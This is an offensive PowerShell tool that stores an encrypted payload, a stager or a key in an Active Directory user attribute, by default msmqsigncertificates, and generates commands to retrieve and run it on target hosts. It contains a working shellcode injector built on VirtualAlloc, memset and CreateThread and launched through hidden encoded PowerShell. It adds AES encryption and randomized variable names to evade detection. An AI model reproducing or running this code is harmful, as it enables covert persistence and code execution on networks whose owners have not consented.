####TODO Checklist
# Create a seperate stager used to write the AD parameter (Or give the option to write directly from AD from the current machine)
# e.g. If stager is being stored, base64 encode it, store it, and generate PS oneliner to call it.
# If payload is being stored, generate stager to decrypt and execute payload.
# If key is being stored, generate stager to grab key, decrypt, and execute payload.
# Note: encoded command parameter does not support base64 encoded newlines. Has to be a custom payload of a powershell one liner.
$script:ADProperty
$script:Storage
$script:custom
$script:customkey
$script:shellcode
$script:key
$script:fullpayload
$script:EncryptedString
$script:EncryptedB64
$script:base64IV
$script:WriteScript
$script:quesWriteScript
$script:targetDomain
$script:username

function Get-Answers {
	
	while (!$script:ADProperty ){
		$script:ADProperty =(($default='msmqsigncertificates'),(Read-Host "What AD Property do you want to store into? (Default is msmqsigncertificates)")) -match '\S' | select -last 1	
	}
    while (!$script:username){
        $script:username = [Environment]::UserName
        $script:username = (($default=$script:username),(Read-Host "What user will this be stored under? (Default is: $script:username)")) -match '\S' | select -last 1
    }
	while (!$script:targetDomain){
		$script:targetDomain = (($default=$ENV:USERDNSDOMAIN),(Read-Host "What is the name of the target Domain? (Default is: $env:USERDNSDOMAIN)")) -match '\S' | select -last 1
	}	
	while (!$script:Storage -or $script:Storage -eq "Invalid"){
	$script:Storage = Read-Host "What do you want to store in the $script:ADProperty property? [Stager,Payload,Key]"
		switch ($script:Storage){
		"Stager"{$script:Storage = "Stager"}
		"Payload" {$script:Storage = "Payload"}
		"Key" {$script:Storage = "Key"}
		default {$script:Storage = "Invalid"}
		}
	}
	while (!$script:custom -or $script:custom -eq "Invalid"){
		$script:custom = Read-Host "Do you want to use a custom payload? Default is Yes:[(Y)es/(N)o]"
		switch ($script:custom){
			"Y" {$script:custom = "True"}
			"Yes" {$script:custom = "True"}
			"N" {$script:custom = "False"}
			"No" {$script:custom = "False"}
			"" {$script:custom = "True"} #Default if enter is pressed
			default {$script:custom = "Invalid"}
		}
	}
		do {
		if ($script:custom -eq "True"){
			$file = Read-Host "Please enter the filename where your base64 encoded payload is stored"
			$script:fullpayload = Get-Content $file
		}
		elseif ($script:custom -eq "False") {
			$file = Read-Host "Please enter the filename where your shellcode is stored"
			$script:shellcode = Get-Content $file
			$script:fullPayload = "`$shellcode = '`$code = ''[DllImport(`"kernel32.dll`")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(`"kernel32.dll`")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(`"msvcrt.dll`")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';`$winFunc = Add-Type -memberDefinition `$code -Name `"Win32`" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]`$sc64 = $script:Shellcode;[Byte[]]`$sc = `$sc64;`$size = 0x1000;if (`$sc.Length -gt 0x1000) {`$size = `$sc.Length};`$x=`$winFunc::VirtualAlloc(0,0x1000,`$size,0x40);for (`$i=0;`$i -le (`$sc.Length-1);`$i++) {`$winFunc::memset([IntPtr](`$x.ToInt32()+`$i), `$sc[`$i], 1)};`$winFunc::CreateThread(0,0,`$x,0,0,0);for (;;) { Start-sleep 60 };';`$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$shellcode));if(`$env:PROCESSOR_ARCHITECTURE -eq `"AMD64`"){`$powershellx86 = `$env:SystemRoot + `"syswow64WindowsPowerShellv1.0powershell.exe`";`$cmd = `"-noprofile -windowstyle hidden -noninteractive -EncodedCommand`";iex `"& `$powershellx86 `$cmd `$goat`"}else{`$cmd = `"-noprofile -windowstyle hidden -noninteractive -EncodedCommand`";iex `"& powershell `$cmd `$goat`";}"	
		}
	} while ( $? -ne $True)
	while (!$script:customkey -or $script:customKey -eq "Invalid"){
			$script:customKey = Read-Host "Do you want me to generate a random key?[(Y)es/(N)o]"
			switch ($script:customKey){
			"N" {while($script:key.length -ne 16){$script:key = Read-Host "Enter a 16 character key:"}}
			"No" {while($script:key.length -ne 16){$script:key = Read-Host "Enter a 16 character key:"}}
			"Y" {$script:Key = Invoke-RandomKey(16)}
			"Yes" {$script:Key = Invoke-RandomKey(16)}
			"" {$Script:Key = Invoke-RandomKey(16)}
			default {$script:customKey = "Invalid"}
		}
	}
	Invoke-EncryptPayload ($script:fullPayload)
		while (!$script:writeScript -or $script:writeScript -eq "Invalid"){
			$script:quesWriteScript = Read-Host "Do you want to write to AD directly from this machine? [(Y)es/(N)o]"
			switch ($script:quesWriteScript){
			"Y" {$script:writeScript = "False"}
			"Yes" {$script:writeScript = "False"}
			"N" {$script:writeScript = "True"}
			"No" {$script:writeScript = "True"}
			default {$script:writeScript = "Invalid"}
		}
	}
	Invoke-GenerateStager($script:Storage)	
}

function Invoke-EncryptPayload ($payload){
	$bytes = [System.Text.UnicodeEncoding]::Unicode.getbytes($payload)
    $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider 
	$AES.Mode = "CBC"
	$AES.BlockSize = 128
	$AES.KeySize = 256
	$AES.Key = [System.Text.UnicodeEncoding]::Unicode.GetBytes($script:key)
    $AES.Padding="PKCS7"
	Write-Output "Encrypting payload with key: $script:key"
	$encryptor = $AES.CreateEncryptor()
	$script:encryptedString = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
	$StageIV = $AES.IV
	$script:EncryptedB64 = [System.Convert]::ToBase64String($script:encryptedString)
	$script:Base64IV = [System.Convert]::ToBase64String($StageIV)
	$AES.Clear()
}

function Invoke-RandomKey ($length) {
	$TempPassword = -join ((65..90)+(97..122) | Get-Random -Count $length | % {[char]$_})
	return $TempPassword
}

function Invoke-WritePayloadToAD ($payload) {
	#Write String to AD
	$AD = ([adsisearcher]"(samaccountname=$script:username)").FindOne().GetDirectoryEntry()
	$AD.Put($script:ADProperty, $payload)
	$AD.SetInfo()
}

function Invoke-GenerateStager ($StagerType) {
	$varAESManaged = Invoke-RandomKey(16)
	$varUnencryptedData = Invoke-RandomKey(16)
	$varEncryptedB64 = Invoke-RandomKey(16)
	$varEncryptedB64IV = Invoke-RandomKey(16)
	$varUTF8 = Invoke-RandomKey(16)
	$varIV = Invoke-RandomKey(16)
	$varKey = Invoke-RandomKey(16)
	$varBytes = Invoke-RandomKey(16)
	$varHash = Invoke-RandomKey(16)
	$varDecryptor = Invoke-RandomKey(16)
	
	switch($script:Storage) 
	{
		"Stager" {
			$keylocation = Read-Host "Provide the full path to where the key will be stored"
			$Stager += "`$$varEncryptedB64 = '$script:EncryptedB64'`n"
			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UnicodeEncoding`n"
			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
			$Stager += "`$$varKey = Read-Host 'you know what I need'`n"
			$Stager += "`$$varaesManaged = New-Object System.Security.Cryptography.AesCryptoServiceProvider`n"
            $Stager += "`$$varaesManaged.Mode = 'CBC'`n"
			$Stager += "`$$varaesManaged.BlockSize = 128`n"
			$Stager += "`$$varaesManaged.KeySize = 256`n"
			$Stager += "`$$varaesManaged.IV = `$$varIV`n"
			$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
            $Stager += "`$$varaesManaged.Padding = 'PKCS7'`n"
			$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
			$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
			$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::Unicode.GetString(`$$varunencryptedData).Trim([char]0)`n"
			$Stager += "powershell.exe -enc `$$varunencrypteddata`n"
			$Stager += "`$$varAESManaged.Clear()`n"
            If ($script:writeScript -eq "False"){
				Invoke-WritePayloadToAD($Stager)	
			}
			else {
				$StagerBytes = [System.text.encoding]::Unicode.GetBytes($Stager) 
				$StagerB64 = [Convert]::ToBase64String($StagerBytes)
				$OneLine = "`$CB=([adsisearcher]`"(samaccountname=$script:username)`").FindOne().GetDirectoryEntry();`$CB.Put(`"$script:ADProperty`",`"$StagerB64`");`$CB.SetInfo();"
				Write-Host "Command to Write to AD has been output to WriteToAD.txt"
				$OneLine | Out-File WriteToAD.txt
			}
			Write-Host "Command to execute has been written out to Execute.txt"
			$ExecuteCommand = "`$DomainController=([ADSI]'LDAP://RootDSE').dnshostname;`$Domain=`"$script:TargetDomain`";`$DC=([ADSI]'LDAP://RootDSE');`$DN=`"DC=`$(`$Domain.Replace('.',',DC='))`";`$SearchString=`"LDAP://`$DomainController/`$DN`";`$Searcher=New-Object System.DirectoryServices.DirectorySearcher([ADSI]`$SearchString);`$Searcher.Filter=`"(samaccountname=$script:username)`";`$User=`$Searcher.FindOne();`$c=[System.Text.Encoding]::ASCII.GetString(`$User.Properties.$script:AdProperty[0]);powershell.exe `$c"
			$ExecuteCommand | Out-File Execute.Txt
			
		}
		"Payload" {
			$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
			$Stager += "`$Domain = `"$script:targetDomain`"`n`n"
			$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
			$Stager += "`$DN = `"DC=`$(`$Domain.Replace('.', ',DC='))`"`n"
			$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
			$Stager += "`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]`$SearchString)`n"
			$Stager += "`$Searcher.Filter =`"(samaccountname=$script:username)`"`n"
			$Stager += "`$User = `$Searcher.FindOne()`n"
			$Stager += "`$$varEncryptedB64 = [System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0])`n"
			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UnicodeEncoding`n"
			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
			$Stager += "`$$varKey = Read-Host 'you know what I need'`n"	#How do we wanna provide the key? Pipeline? Read-Host?
			$Stager += "`$$varaesManaged = New-Object System.Security.Cryptography.AesCryptoServiceProvider`n"
            $Stager += "`$$varaesManaged.Mode = 'CBC'`n"
			$Stager += "`$$varaesManaged.BlockSize = 128`n"
			$Stager += "`$$varaesManaged.KeySize = 256`n"
			$Stager += "`$$varaesManaged.IV = `$$varIV`n"
			$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
            $Stager += "`$$varaesManaged.Padding = 'PKCS7'`n"
			$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
			$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
			$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::Unicode.GetString(`$$varunencryptedData).Trim([char]0)`n"
			$Stager += "powershell.exe -enc `$$varunencrypteddata`n"
			$Stager += "`$$varAESManaged.Clear()`n"
			$Stager | Out-File stager.ps1
			If ($script:writeScript -eq "False"){
				Invoke-WritePayloadToAD($script:encryptedb64)	
			}
			else {
				$OneLine = "`$CB=([adsisearcher]`"(samaccountname=$script:username)`").FindOne().GetDirectoryEntry();`$CB.Put(`"$script:ADProperty`",`"$script:EncryptedB64`");`$CB.SetInfo();"
				Write-Host "Command to write to AD has been output to WriteToAd.txt"
				$OneLine | Out-File WriteAd.txt
			}
		}
		"Key" {
			$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
			$Stager += "`$Domain = `"$script:targetDomain`"`n"
			$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
			$Stager += "`$DN = `"DC=`$(`$Domain.Replace('.', ',DC='))`"`n"
			$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
			$Stager += "`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]`$SearchString)`n"
			$Stager += "`$Searcher.Filter =`"(samaccountname=$script:username)`"`n"
			$Stager += "`$User = `$Searcher.FindOne()`n"
			$Stager += "`$$varKey = [System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0])`n"
			$Stager += "`$$varEncryptedB64 = '$script:EncryptedB64'`n"
			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UnicodeEncoding`n"
			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
			$Stager += "`$$varaesManaged = New-Object System.Security.Cryptography.AesCryptoServiceProvider`n"
            $Stager += "`$$varaesManaged.Mode = 'CBC'`n"
			$Stager += "`$$varaesManaged.BlockSize = 128`n"
			$Stager += "`$$varaesManaged.KeySize = 256`n"
			$Stager += "`$$varaesManaged.IV = `$$varIV`n"
			$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
            $Stager += "`$$varaesManaged.Padding = 'PKCS7'`n"
			$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
			$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
			$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::Unicode.GetString(`$$varunencryptedData).Trim([char]0)`n"
			$Stager += "powershell.exe -enc `$$varunencrypteddata`n"
			$Stager += "`$$varAESManaged.Clear()`n"
			$Stager | Out-File stager.ps1
			If ($script:writeScript -eq "False"){
				Invoke-WritePayloadToAD($script:key)	
			}
			else {
				$OneLine = "`$CB=([adsisearcher]`"(samaccountname=$script:username)`").FindOne().GetDirectoryEntry();`$CB.Put(`"$script:ADProperty`",`"$script:key`");`$CB.SetInfo();"
				Write-Host "Command to write to AD has been output to WriteToAd.txt"
				Write-Host "Key has been output to key.txt"
				$OneLine | Out-File WriteAd.txt
			}
			Write-Host "Execute Stager on Target Host to run your stored command"
		}
		default {"Incorrect Storage type chosen"}
	}

}

Get-Answers
Write-Host "Output has been written to key.txt in case you lose it"
$script:key | Out-File key.txt
